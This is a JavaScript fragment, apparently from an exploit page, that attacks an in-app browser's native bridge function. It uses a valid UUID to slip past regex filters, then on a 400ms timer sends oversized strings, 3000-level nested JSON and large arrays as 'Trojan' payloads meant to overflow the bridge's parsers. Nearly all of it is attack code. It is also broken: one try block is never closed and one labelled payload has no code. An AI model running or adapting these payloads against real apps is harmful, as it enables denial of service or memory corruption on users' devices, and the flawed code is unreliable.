        const giantString = "A".repeat(65536); 
        let deepJson = '{"data":';
        for(let i=0; i<3000; i++) deepJson += '{"a":';
        deepJson += '"pwn"';
        for(let i=0; i<3000; i++) deepJson += '}';
        deepJson += '}';

        // A valid UUID to bypass regex filters
        const validUUID = "90dd8846-f47b-4312-8307-3681dc5bec88";

        function sendTrojan() {
            if (typeof window.__call_iabjs_unified_bridge !== 'function') {
                log("Waiting for bridge...");
                return;
            }

            log("[*] Firing structured payloads...");

            // Trojan 1: Overflow the Action Router

            // Trojan 2: Overflow the Payload Parser
            // We use a known valid action "page_language" but give it a 64KB JSON string
            try { 
                let payload1 = JSON.stringify({ "message": giantString });
                window.__call_iabjs_unified_bridge("page_language", validUUID, payload1); 
            } catch(e){}

            // Trojan 3: Stack-Buster JSON
            // Feed the deeply nested JSON to the text_classification parser
            try { 
                let payload2 = JSON.stringify({ "message": deepJson });
                window.__call_iabjs_unified_bridge("text_classification", validUUID, payload2);

            // It expects a JSON object, we give it a massive Array
            try {
                window.__call_iabjs_unified_bridge("initializeCallbackHandler", validUUID, Array(5000).fill("A"));
            } catch(e){}
        }

        // Fire gently to ensure they are processed sequentially by the native thread
        setInterval(sendTrojan, 400);
